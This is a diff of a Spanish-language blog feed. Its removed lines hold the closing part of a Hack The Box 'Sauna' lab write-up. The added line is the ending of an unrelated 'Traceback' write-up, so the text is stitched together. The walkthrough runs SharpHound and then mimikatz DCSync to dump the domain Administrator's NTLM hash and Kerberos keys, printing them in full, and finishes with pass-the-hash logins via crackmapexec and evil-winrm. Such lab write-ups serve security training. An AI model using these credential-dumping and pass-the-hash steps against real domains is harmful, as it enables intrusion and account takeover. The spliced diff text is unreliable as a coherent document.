-&lt;p&gt;A este punto, vamos a utilizar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHount&lt;/code&gt; para ver de que forma podemos escalar privilegios; por lo tanto la instalamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-get install neo4j bloodhount -y&lt;/code&gt;, ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neo4j console&lt;/code&gt; y nos indicará que ingresemos vía web &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost:7474/&lt;/code&gt; cuyas credenciales son &lt;strong&gt;neo4j : neo4j&lt;/strong&gt;, nos pedirá que las cambiemos.&lt;/p&gt;
-
-&lt;p&gt;Posteriormente abrimos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bloodhount &amp;amp;&lt;/code&gt; y nos descargamos &lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1&quot;&gt;SharpHound.ps1&lt;/a&gt; para obtener la información que necesitmaos. Lo transferimos a la máquina víctima:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
-&lt;span class=&quot;nt&quot;&gt;--2022-01-30&lt;/span&gt; 23:26:25--  https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
-Resolviendo raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;... 185.199.110.133, 185.199.109.133, 185.199.111.133, ...
-Conectando con raw.githubusercontent.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class=&quot;o&quot;&gt;)[&lt;/span&gt;185.199.110.133]:443... conectado.
-Petición HTTP enviada, esperando respuesta... 200 OK
-Longitud: 974235 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;951K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/plain]
-Grabando a: «SharpHound.ps1»
-
-SharpHound.ps1                   100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt; 951.40K  4.73MB/s    en 0.2s    
-
-2022-01-30 23:26:26 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.73 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - «SharpHound.ps1» guardado &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;974235/974235]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; upload /home/k4miyo/Documentos/HTB/Sauna/content/SharpHound.ps1 SharpHound.ps1
-Info: Uploading /home/k4miyo/Documentos/HTB/Sauna/content/SharpHound.ps1 to SharpHound.ps1
-
-                                                             
-Data: 1298980 bytes of 1298980 bytes copied
-
-Info: Upload successful!
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-
-
-    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments
-
-
-Mode                LastWriteTime         Length Name
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/31/2022   5:27 AM         974235 SharpHound.ps1
-
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Lo importamos y ejecutamos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; Import-Module .&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;harpHound.ps1
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; Invoke-BloodHound &lt;span class=&quot;nt&quot;&gt;-CollectionMethod&lt;/span&gt; All
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-
-
-    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments
-
-
-Mode                LastWriteTime         Length Name
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/31/2022   5:31 AM           9066 20220131053101_BloodHound.zip
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/31/2022   5:27 AM         974235 SharpHound.ps1
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/31/2022   5:31 AM          11122 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
-
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos descargamos a nuestra máquina los archivos generados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; download 20220131053101_BloodHound.zip
-Info: Downloading 20220131053101_BloodHound.zip to ./20220131053101_BloodHound.zip
-
-                                                             
-Info: Download successful!
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; download ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
-Info: Downloading ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin to ./ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
-
-                                                             
-Info: Download successful!
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;El archivo que más nos importa es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;20220131053101_BloodHound.zip&lt;/code&gt; el cual lo abrimos con &lt;strong&gt;BloodHound&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-sauna/sauna-bloodhound.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De esta forma podemos ver de una forma más gráfica como podemos escalar privilegios. Si pulsamos en la opción &lt;strong&gt;Find Principals with DCSync Rights&lt;/strong&gt; y vemos que el usuario &lt;strong&gt;svc_loanmgr&lt;/strong&gt; tiene los privilegios &lt;strong&gt;&lt;em&gt;DS-Replication-Get-Changes-All&lt;/em&gt;&lt;/strong&gt; y &lt;strong&gt;&lt;em&gt;DS-Replication-Get-Changes&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-sauna/sauna-bloodhound1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-sauna/sauna-bloodhound2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Incluso con la herramienta nos indican una forma de como debemos ejecutar los comandos para escalar privilegios; por lo tanto, vamos a ejecutarlo. Primero pasamos el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mimikatz.exe&lt;/code&gt; a la máquina víctima, para este caso el de 64 bits.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ locate mimikatz.exe
-/usr/share/mimikatz/Win32/mimikatz.exe
-/usr/share/mimikatz/x64/mimikatz.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; upload /home/k4miyo/Documentos/HTB/Sauna/content/mimikatz.exe mimikatz.exe
-Info: Uploading /home/k4miyo/Documentos/HTB/Sauna/content/mimikatz.exe to mimikatz.exe
-
-                                                             
-Data: 1666740 bytes of 1666740 bytes copied
-
-Info: Upload successful!
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-
-
-    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments
-
-
-Mode                LastWriteTime         Length Name
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/31/2022   5:31 AM           9066 20220131053101_BloodHound.zip
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/31/2022   5:47 AM        1250056 mimikatz.exe
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/31/2022   5:27 AM         974235 SharpHound.ps1
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/31/2022   5:31 AM          11122 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
-
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Procedemos a ejecutarlo en la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; ./mimikatz.exe &lt;span class=&quot;s2&quot;&gt;&quot;lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Adm[829/829]
-r&quot;&lt;/span&gt;                              
-                                                                                                                                 
-  .#####.   mimikatz 2.2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#18362 Feb 29 2020 11:13:36                                                                     &lt;/span&gt;
- .## ^ &lt;span class=&quot;c&quot;&gt;##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)      &lt;/span&gt;
- &lt;span class=&quot;c&quot;&gt;## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )&lt;/span&gt;
- &lt;span class=&quot;c&quot;&gt;## \ / ##       &amp;gt; http://blog.gentilkiwi.com/mimikatz                                                                           &lt;/span&gt;
- &lt;span class=&quot;s1&quot;&gt;'## v ##'&lt;/span&gt;       Vincent LE TOUX             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; vincent.letoux@gmail.com &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;s1&quot;&gt;'#####'&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://pingcastle.com / http://mysmartlogon.com   &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;/
-                                
-mimikatz&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;commandline&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DC] &lt;span class=&quot;s1&quot;&gt;'EGOTISTICAL-BANK.LOCAL'&lt;/span&gt; will be the domain      
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DC] &lt;span class=&quot;s1&quot;&gt;'SAUNA.EGOTISTICAL-BANK.LOCAL'&lt;/span&gt; will be the DC server
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DC] &lt;span class=&quot;s1&quot;&gt;'Administrator'&lt;/span&gt; will be the user account
-                                
-Object RDN           : Administrator      
-                                
-&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; SAM ACCOUNT &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
-                                
-SAM Username         : Administrator
-Account Type         : 30000000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; USER_OBJECT &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-User Account Control : 00010200 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; NORMAL_ACCOUNT DONT_EXPIRE_PASSWD &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Account expiration   :                                          
-Password last change : 7/26/2021 8:16:16 AM
-Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
-Object Relative ID   : 500                                      
-                                                                
-Credentials:                                                    
-  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
-    ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
-    ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff
-    ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f
-    lm  - 0: 365ca60e4aba3e9a71d78a3912caf35c
-    lm  - 1: 7af65ae5e7103761ae828523c7713031
-                                                                
-Supplemental Credentials:                                       
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary:NTLM-Strong-NTOWF &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                                   
-    Random Value : 716dbadeed0e537580d5f8fb28780d44
-                                                                
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary:Kerberos-Newer-Keys &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                                 
-    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
-    Default Iterations : 4096                                   
-    Credentials                                                 
-      aes256_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
-      aes128_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : a9f3769c592a8a231c3c972c4050be4e
-      des_cbc_md5       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : fb8f321c64cea87f
-    OldCredentials                                              
-      aes256_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
-      aes128_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 145e4d0e4a6600b7ec0ece74997651d0
-      des_cbc_md5       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 19d5f15d689b1ce5
-    OlderCredentials
-   OldCredentials                                              
-      aes256_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
-      aes128_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 145e4d0e4a6600b7ec0ece74997651d0
-      des_cbc_md5       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 19d5f15d689b1ce5
-    OlderCredentials            
-      aes256_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
-      aes128_hmac       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 52c02b864f61f427d6ed0b22639849df
-      des_cbc_md5       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : d9379d13f7c15d1c
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary:Kerberos &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
-    Credentials
-      des_cbc_md5       : fb8f321c64cea87f
-    OldCredentials
-      des_cbc_md5       : 19d5f15d689b1ce5
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Packages &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-    NTLM-Strong-NTOWF
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Primary:WDigest &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-    01  b4a06d28f92506a3a336d97a66b310fa
-    02  71efaf133c578bd7428bd2e1eca5a044
-    03  974acf4f67e4f609eb032fd9a72e8714
-    04  b4a06d28f92506a3a336d97a66b310fa
-    05  79ba561a664d78d6242748774e8475c5
-    06  f1188d8ed0ca1998ae828a60a8c6ac29
-    07  801ddc727db9fa3de98993d88a9ffa8b
-    08  a779e05da837dd2d303973304869ec0f
-    09  ac2c01846aebce4cbd4e3ec69b47a65d
-    10  6d863d6ae06c3addc49b7a453afe6fa0
-    11  a779e05da837dd2d303973304869ec0f
-    12  6676b9fdd4aa7f298f1ada64c044c230
-    13  5a01167d750636d66e5602db9aece9b7
-    14  f702282bd343c2fee7b98deac8950390
-    15  a099aa3c81f1affeba59d79a6533f60d
-    16  4bae84b8f0b0306788ff9bda4acb3bd4
-    17  976d547fb9e04b0ac5ec60508c275da1
-    18  50c302b71d0e08a1a2be14b56225645f
-    19  edb19e08653443695f6d3599e0a6bddf
-    20  c497465ddc6e2fc14cb0359d0d5de7f8
-    21  2ed0b4b57196fb190a66224b2b17029f
-    22  37d03051ae1cd6046975948564ab01fa
-    23  d4c7554fe1beb0ed712f50cfec470471
-    24  8df495fe69cdce409b9f04ea04289b9e
-    25  40788044be982310920cc0740687fefd
-    26  db7f66f1f1a8f46274d20cfdda5b6e1c
-    27  d70226ec52f1ef198c2e1e955a1da9b6
-    28  abdd681f875a9b3f3a50b36e51692a2c
-    29  dcd140a2ce2bf70fed7ac0e2b60d0dee
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos el hash NTLM del usuario &lt;strong&gt;Administrator&lt;/strong&gt;, por lo tanto vamos a usar &lt;strong&gt;&lt;em&gt;Pass the hash&lt;/em&gt;&lt;/strong&gt;, pero antes vamos a validarlas.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'823452073d75b9d1cf70ebdf86c7f98e'&lt;/span&gt;
-SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SAUNA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator 823452073d75b9d1cf70ebdf86c7f98e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora si ingresamos a la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'823452073d75b9d1cf70ebdf86c7f98e'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.175
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;egotisticalbank&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Active_Directory" /><category term="Powershell" /><category term="Kerberoasting" /><summary type="html">Resolución de la máquina Sauna en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Process_Inspection" /><category term="Arbitrary_File_Upload" /><summary type="html">Resolución de la máquina Traceback en la plataforma de Hack The Box</summary></entry></feed>
